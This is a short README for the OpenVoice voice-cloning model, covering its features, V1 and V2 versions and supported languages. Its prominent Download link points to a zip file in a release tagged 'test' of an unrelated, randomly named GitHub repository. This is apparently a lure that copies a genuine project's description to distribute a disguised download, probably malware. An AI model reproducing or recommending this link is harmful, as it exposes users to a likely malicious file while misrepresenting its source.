# OpenVoice

OpenVoice is an audio foundation model for instant voice cloning. It is designed to synthesize speech using a reference voice while supporting control over tone color, language, accent, emotion, rhythm, pauses, and intonation.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/OpenVoice-1.zip)

## Overview

OpenVoice focuses on versatile voice cloning from short reference audio. The project includes OpenVoice V1 and OpenVoice V2, with V2 adding improved audio quality and native multilingual support.

Supported native languages in OpenVoice V2 include:

- English
- Spanish
- French
- Chinese
- Japanese
- Korean

The project is released under the MIT License for both research and commercial use.

## Main Capabilities

- Instant voice cloning from reference speech
- Tone color cloning for matching a target speaker’s vocal identity
- Multilingual speech generation
- Cross-lingual voice cloning
- Voice style control, including emotion, accent, rhythm, pauses, and intonation
- OpenVoice V2 support for improved audio quality and native multilingual generation

## Versions

### OpenVoice V1

OpenVoice V1 provides voice cloning with tone color transfer, style control, and zero-shot cross-lingual cloning. The generated speech language and reference speech language do not need to be present in the same training dataset.

### OpenVoice V2

OpenVoice V2 includes the V1 feature set and adds:

- Improved training strategy for better audio quality
- Native support for English, Spanish, French, Chinese, Japanese, and Korean
- MIT licensing for commercial and research use
